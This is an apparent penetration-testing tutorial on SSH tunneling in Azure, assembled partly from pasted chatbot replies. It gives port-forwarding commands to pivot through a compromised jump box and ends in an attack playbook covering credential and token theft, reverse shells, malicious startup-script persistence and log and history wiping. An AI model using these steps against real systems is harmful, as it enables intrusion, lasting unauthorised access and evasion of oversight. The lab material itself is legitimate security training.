# SSH

Imagine you have a Locker at school, SSH is like a special combination lock that only you know. When you use SSH, you can securely access your locker from anywhere, even if you ' re not physically at school

<img src="media/image1.png" style="width:4.73196in;height:2.2in" />

# SSH Tunneling in Azure Pentest

In the context of Azure penetration testing, **tunneling** is a technique used to securely route traffic between internal Azure resources and an external attacker-controlled system. This allows for communication with otherwise inaccessible services within the virtual network.

One common method is **SSH tunneling**, where traffic is encapsulated within an encrypted SSH session. This ensures that all transmitted data is secure and obscured from monitoring tools. In addition to secure communication, tunneling can also be used to bypass network restrictions and **mask the true nature of the traffic**, making it valuable for stealthy lateral movement or data exfiltration during post-exploitation.

Tunneling is especially useful when a compromised Azure VM can access internal services, but the attacker cannot directly reach them from the internet. In such cases, tools like **SSH, Socat, or Azure-specific port forwarding techniques** can be used to bridge the gap between the internal environment and the external attack infrastructure.

<img src="media/image2.png" style="width:4.63975in;height:2.69718in" />

## Types of SSH Tunnelling

When performing internal network enumeration or lateral movement in an Azure environment, **SSH tunneling** becomes a critical technique for accessing restricted services. There are three primary types of SSH tunneling:

1.  **Local Port Forwarding** – Forwards traffic from the attacker's machine (local) to a remote internal resource through an intermediate host.

2.  **Remote Port Forwarding** – Forwards traffic from a compromised Azure VM (remote) back to the attacker's machine.

3.  **Dynamic Port Forwarding** – Creates a SOCKS proxy on the attacker’s machine, allowing dynamic routing of traffic through the tunnel.

------------------------------------------------------------------------

**Objective**

To demonstrate how SSH tunneling can be used in Azure to bridge access between an external system and a restricted internal resource.

------------------------------------------------------------------------

**Lab Scenario (Adapted for Azure)**

The setup mimics a common cloud compromise situation:

- **SSH Jump Box (Bastion Host)**

  - **IP (public)**: 192.168.1.104 (accessible from the attacker’s remote machine)

  - **IP (private)**: 192.168.10.1 (connected to an internal Azure subnet)

- **Internal Target VM (SSH client)**

  - **IP**: 192.168.10.2 (inside the Azure virtual network)

- **Attacker Machine (Remote)**

  - Located outside the Azure environment

------------------------------------------------------------------------

**Scenario Overview**

An attacker has compromised the SSH server (jump box) named **Ignite**, which has access to both the internet and the internal network. To reach an internal VM (**192.168.10.2**), which does not expose any services publicly, the attacker establishes an **SSH tunnel** through the jump box.

Using the SSH client on the internal machine (user: **raj**), the attacker sets up a port forwarding tunnel that allows them to interact with the internal system as if it were local. This is a common and powerful technique for post-exploitation in cloud environments, especially where direct access is blocked by NSGs or routing rules.

**Note**: The SSH service must be running on all relevant hosts for tunneling to work.

------------------------------------------------------------------------

Would you like the exact SSH commands for setting up each tunnel type in this Azure lab?

Great! Below are the exact **SSH commands** for each type of tunneling, adapted for your Azure penetration testing lab setup:

------------------------------------------------------------------------

**⚙️ Assumptions**

- You’ve compromised the SSH server (Ignite) at 192.168.1.104, which has access to 192.168.10.2.

- The internal VM (192.168.10.2) is not directly accessible from the internet.

- SSH is enabled and running on all systems.

- You’re connecting from an external attack machine (e.g., Kali Linux).

- You have valid SSH credentials or private key access for the jump box (Ignite).

------------------------------------------------------------------------

**1. 🔁 Local Port Forwarding**

**Use case**: Access an internal Azure VM/service from your local machine via the jump box.

**Command:**

ssh -L 9999:192.168.10.2:22 azureuser@192.168.1.104

**Explanation**:

- Binds your local port 9999 to 192.168.10.2:22 (SSH service on the internal VM).

- You can now SSH into the internal VM like this:

ssh raj@localhost -p 9999

------------------------------------------------------------------------

**2. 🌐 Remote Port Forwarding**

**Use case**: Allow the internal Azure VM to initiate a connection back to your attack machine (useful when inbound rules block direct access).

**Command (run from inside Azure):**

ssh -R 2222:localhost:22 attacker@\<your_public_IP\>

**Explanation**:

- Tunnels the internal VM’s SSH port to your attack box’s port 2222.

- On your machine, you can connect back to the internal machine like this:

ssh raj@localhost -p 2222

🛡️ Your attack machine must have port 2222 open and SSH running (or use Socat to handle this).

------------------------------------------------------------------------

**3. 🧦 Dynamic Port Forwarding (SOCKS Proxy)**

**Use case**: Route browser or proxy-aware tools through the Azure network to reach internal services (e.g., internal web apps, metadata endpoints).

**Command:**

ssh -D 1080 azureuser@192.168.1.104

**Explanation**:

- Creates a SOCKS5 proxy at localhost:1080.

- Configure tools like Burp Suite or your browser to use 127.0.0.1:1080 as a SOCKS proxy.

- All traffic will be routed via the jump box into the Azure VNet.

------------------------------------------------------------------------

Would you like to see how to automate any of these tunnels with autossh or incorporate them into a full Azure post-exploitation playbook?

Perfect. Here’s how to automate SSH tunnels in your Azure post-exploitation playbook using autossh. This ensures your tunnels stay alive even if connections drop—a key tactic during long engagements.

------------------------------------------------------------------------

**🔄 Automating SSH Tunnels with autossh**

autossh monitors and automatically restarts SSH tunnels when they break, ideal for maintaining access in cloud environments like Azure.

**Install autossh (on Kali/Ubuntu)**

sudo apt install autossh

------------------------------------------------------------------------

**🛠️ 1. Automating Local Port Forwarding**

autossh -M 0 -f -N -L 9999:192.168.10.2:22 azureuser@192.168.1.104

- -M 0: Disables monitoring port (prevents false positives).

- -f: Backgrounds the process.

- -N: No command execution (just tunneling).

- -L: Local port forward.

You can now SSH to localhost:9999 persistently.

------------------------------------------------------------------------

**🛠️ 2. Automating Remote Port Forwarding**

Assuming your attacker box is reachable at yourIP:2222:

autossh -M 0 -f -N -R 2222:localhost:22 attacker@yourIP

Ensure your external box allows incoming connections on port 2222.

------------------------------------------------------------------------

**🛠️ 3. Automating Dynamic (SOCKS) Proxy**

autossh -M 0 -f -N -D 1080 azureuser@192.168.1.104

Configure tools like:

- Firefox or Burp to use localhost:1080 (SOCKS5 proxy)

- ProxyChains or Chisel for chaining further into the network

------------------------------------------------------------------------

**💡 Pro Tip: Use SSH keys to avoid interactive login:**

autossh -i ~/.ssh/azure_key.pem -M 0 -f -N -L 9999:192.168.10.2:22 azureuser@192.168.1.104

------------------------------------------------------------------------

Would you like help integrating this into a Bash script or persistent service for long-term access in Azure environments?

### Dynamic SSH Tunnelling via Windows in Azure Penetration Testing

Here is a cleaned-up, corrected, and Azure-focused version of your section on **Dynamic SSH Tunneling through Windows** using **PuTTY**:

------------------------------------------------------------------------

**Dynamic SSH Tunneling via Windows in Azure Penetration Testing**

In Azure penetration testing, dynamic SSH tunneling is a powerful technique that allows attackers to pivot through a compromised VM to access internal Azure resources. This method uses SSH to create a **SOCKS proxy**, enabling tools like browsers or SSH clients to route traffic into the internal Azure network.

In this scenario, we demonstrate how a **Windows-based attacker machine** uses **PuTTY** to tunnel into an internal Azure VM by routing through a compromised **jump box** (SSH server).

------------------------------------------------------------------------

**Lab Setup Overview**

- **SSH Server (Jump Box)**

  - Public IP: 192.168.1.104 (accessible from the attacker)

  - Internal IP: 192.168.10.1 (has access to the internal subnet)

- **Internal Azure VM (Target)**

  - IP: 192.168.10.2

  - SSH is running

- **Attacker Machine**

  - Windows PC using PuTTY

------------------------------------------------------------------------

**🧪 Steps to Establish Dynamic SSH Tunnel Using PuTTY**

1.  **Open PuTTY** and enter the public IP of the SSH jump box: 192.168.1.104 (Port: 22).

2.  In the left menu, go to:\
    Connection \> SSH \> Tunnels

3.  Under **Add new forwarded port**:

    - **Source port**: 7000

    - **Destination**: Leave blank (because this is a **dynamic** tunnel)

    - **Type**: Select **Dynamic**

    - Click **Add**

4.  Return to the **Session** category and click **Open** to connect.

5.  **Login to the SSH server (Ignite)** using valid credentials. The tunnel is now active.

------------------------------------------------------------------------

**🧭 Using the SOCKS Proxy to Access Internal Azure Services**

To access the internal VM (192.168.10.2) via SSH through the active SOCKS proxy:

1.  Open **a new instance of PuTTY**.

2.  In the **Session** tab:

    - **Host Name**: 192.168.10.2

    - **Port**: 22

3.  Navigate to:\
    Connection \> Proxy

4.  Configure the proxy as follows:

    - **Proxy type**: SOCKS 5

    - **Proxy hostname**: 127.0.0.1

    - **Port**: 7000

5.  Return to the **Session** tab and click **Open**.

You are now connected to the internal Azure VM (raj@192.168.10.2) through the SOCKS tunnel established via the compromised jump box.

------------------------------------------------------------------------

**Success!** You’ve bypassed Azure VNet isolation using dynamic port forwarding from a Windows-based attacker system.

Would you like a visual diagram of this tunnel setup in an Azure context?

Here’s a professionally written and corrected version of your content, tailored specifically for **Azure penetration testing** scenarios using both **Kali Linux and Windows**.

------------------------------------------------------------------------

**🔐 Dynamic & Local SSH Tunneling for Azure Penetration Testing**

SSH tunneling is essential in Azure pentests when accessing isolated internal resources. The following demonstrates how an attacker can leverage **dynamic and local SSH tunneling** from both **Kali Linux and Windows** systems to pivot through a compromised Azure VM (jump box) and reach internal targets like VMs or services.

------------------------------------------------------------------------

**🌐 Dynamic SSH Tunneling via Kali Linux (Port 80)**

In scenarios where outbound traffic is restricted (e.g., only HTTP/HTTPS allowed), attackers can use **SSH over port 80** to bypass NSGs or firewalls.

**Command:**

ssh -D 7000 -p 80 ignite@192.168.1.104

- -D 7000: Opens a dynamic SOCKS5 proxy on port 7000.

- -p 80: Uses port 80 for the SSH connection (useful when SSH on 22 is blocked).

**Steps to Configure Firefox Proxy:**

1.  Go to **Settings \> Network Settings \> Manual Proxy Configuration**.

2.  Set **SOCKS Host**: 127.0.0.1, Port: 7000

3.  Select **SOCKS v5**

4.  Check “Proxy DNS when using SOCKS v5”

This routes browser traffic into the Azure network through the compromised jump box.

------------------------------------------------------------------------

**🛠 Dynamic SSH Tunneling + tsocks in Kali (Port 22)**

This method allows command-line tools to use the SOCKS proxy tunnel for accessing internal systems.

**Step 1: Create the SOCKS tunnel**

ssh -D 7000 ignite@192.168.1.104

**Step 2: Install tsocks**

sudo apt install tsocks

**Step 3: Configure /etc/tsocks.conf**

server = 127.0.0.1

server_port = 7000

**Step 4: Connect to an internal Azure VM**

tsocks ssh raj@192.168.10.2

This reroutes the SSH connection through the SOCKS tunnel and into the Azure internal network.

------------------------------------------------------------------------

**🖥️ Local SSH Tunneling via Windows (PuTTY)**

**Use Case**: Directly access a specific internal VM or service via the jump box.

**Steps:**

1.  Open **PuTTY** and connect to 192.168.1.104 (SSH jump box).

2.  In the **left panel**, go to: Connection \> SSH \> Tunnels.

3.  Set:

    - **Source port**: 7000

    - **Destination**: 192.168.10.2:22

    - **Type**: Local

    - Click **Add**

4.  Return to the **Session** tab and click **Open** to connect.

Once connected:

1.  Open a **new PuTTY window**.

2.  Set:

    - **Host Name**: localhost

    - **Port**: 7000

    - **Connection Type**: SSH

3.  Click **Open** to access the internal VM as if it were local.

**Success**: You’ve tunnelled into an Azure internal VM using both dynamic and local port forwarding from Windows and Linux.

### Local & Remote SSH Tunnelling

SSH tunnelling is an essential technique in Azure PenTesting to access isolated systems by pivoting through compromised VMs. Below, we demonstrate both **local** and **remote** SSH tunnelling from **Kali Linux**, **Windows (PuTTY)**, and **Ubuntu**, showing how attackers gain shell access to internal Azure VMs from external systems.

### Local SSH Tunnelling via Kali Linux

Used when the attacker has access to a jump box (e.g., a compromised Azure VM) and wants to reach an internal VM from their Kali machine.

**Step 1 – Create the Tunnel**:

ssh -L 7000:192.168.10.2:22 ignite@192.168.1.104

- This forwards local port 7000 to the internal VM (192.168.10.2:22) via the jump box (192.168.1.104).

**Step 2 – Connect to the Internal VM**: ssh raj@127.0.0.1 -p 7000

**Result**: You've gained shell access to an internal Azure VM by tunnelling through a compromised server.

### Remote SSH Tunnelling via Windows (PuTTY)

Used when an internal Azure VM needs to expose access *outward* to an external attacker-controlled system.

**On the Internal Azure VM (Jump Box):**

1.  Open PuTTY and connect to the attacker's external system (192.168.1.108).

2.  In **SSH \> Tunnels**:

    - **Source port**: 7000

    - **Destination**: 192.168.10.2:22

    - **Type**: Remote

    - Click **Add**

3.  Go back to **Session**, enter IP 192.168.1.108, Port 22, and click **Open** to connect.

**On the Attacker System (192.168.1.108):**

ssh raj@127.0.0.1 -p 7000

**Result**: The attacker can now access the internal Azure VM from the outside using port 7000.

### Remote SSH Tunnelling via Ubuntu CLI

If you prefer CLI over PuTTY, the same process can be done via terminal on an internal Linux VM:

**From the Jump Box (Ignite):**

ssh -R 7000:192.168.10.2:22 root@192.168.1.108

- This tells the jump box to open port 7000 on the **remote (attacker)** system and forward it to the internal VM (192.168.10.2).

**Then, from the attacker’s external machine:** ssh raj@127.0.0.1 -p 7000

**Result**: Remote access to the internal Azure VM established through reverse tunnelling.

**Summary Table**

| **Method** | **Tool** | **Tunnel Type** | **Initiated From** | **Access Gained To** |
|----|----|----|----|----|
| Local Tunnel (Linux) | SSH CLI | Local | Kali | Internal VM |
| Remote Tunnel (Windows) | PuTTY | Remote | Azure VM | Attacker System |
| Remote Tunnel (Linux CLI) | SSH CLI | Remote | Azure VM | Attacker System |

## Azure Lateral Movement Attack Playbook

------------------------------------------------------------------------

**Objective**

To demonstrate and document effective techniques for lateral movement within an Azure environment using SSH tunneling methods through a compromised jump box.

------------------------------------------------------------------------

**Assumptions**

- Attacker has access to a public-facing Azure VM (jump box)

- Internal VMs are only accessible within private subnets (no public IPs)

- SSH service is running on all relevant machines

- Azure NSGs and routing allow outbound SSH or HTTP/HTTPS traffic

------------------------------------------------------------------------

**Phase 1: Reconnaissance**

**1. Identify the Internal Network Range**

- Run ip a, ip r, or ifconfig on the jump box

- Enumerate DNS, ARP tables, and known host files

**2. Enumerate Internal VMs**

- Use tools like nmap, ping, or arp-scan from the jump box

- Determine internal IPs and open ports

------------------------------------------------------------------------

**Phase 2: SSH Tunneling Setup**

**Method A: Dynamic SSH Tunneling (Proxy Pivoting)**

**Command (from attacker):**

ssh -D 7000 ignite@\<JumpBox-IP\>

- Proxy all traffic through the jump box

- Configure Firefox or proxychains to route traffic via 127.0.0.1:7000

**Method B: Local SSH Tunneling (Direct Pivot to Internal VM)**

**Command (from attacker):**

ssh -L 7000:\<Internal-VM-IP\>:22 ignite@\<JumpBox-IP\>

**Then:**

ssh raj@127.0.0.1 -p 7000

- Used to reach an internal host via jump box using a local port forward

**Method C: Remote SSH Tunneling (Reverse Shell Access)**

**Command (from jump box to attacker):**

ssh -R 7000:\<Internal-VM-IP\>:22 root@\<Attacker-IP\>

**Then (on attacker system):**

ssh raj@127.0.0.1 -p 7000

- Opens a backchannel from the internal VM to the attacker through the jump box

------------------------------------------------------------------------

**Phase 3: Post-Exploitation Activities**

**1. Credential Dumping**

- Extract credentials from .ssh, .bash_history, azureProfile.json

**2. Token Collection & Abuse**

- Dump Azure AD tokens using AzureHound, ROADtools, or PowerZure

**3. File Transfers**

- Use scp, sftp, or python3 -m http.server through tunnels

**4. Privilege Escalation**

- Enumerate sudo permissions, kernel exploits, misconfigured services

------------------------------------------------------------------------

**Phase 4: Lateral Movement & Persistence**

**1. SSH into Additional VMs**

- Reuse credentials or keys across discovered systems

**2. Deploy Reverse Shells**

- Use nc, socat, or reverse SSH for persistent access

**3. Modify Startup Scripts**

- Insert malicious entries in .bashrc, rc.local, or crontab

**4. Azure-Specific Techniques**

- Enumerate Azure IMDS (curl http://169.254.169.254/metadata/...)

- Abuse Managed Identities to escalate access

------------------------------------------------------------------------

**Phase 5: Covering Tracks**

- Clear shell history: history -c && history -w

- Remove logs from /var/log/auth.log, /var/log/secure, /home/\<user\>/.bash_history

- Remove SSH keys if added for persistence

------------------------------------------------------------------------

**Tools Required**

- nmap, proxychains, tsocks, ssh, socat, netcat, putty, AzureHound, ROADtools

------------------------------------------------------------------------

**Notes**

- Ensure port 22 or other required ports are allowed in NSGs

- Use non-standard ports if outbound 22 is blocked (e.g., 443 or 80)

- Leverage automation with autossh or scripts for long-term persistence

------------------------------------------------------------------------

**End of Playbook**
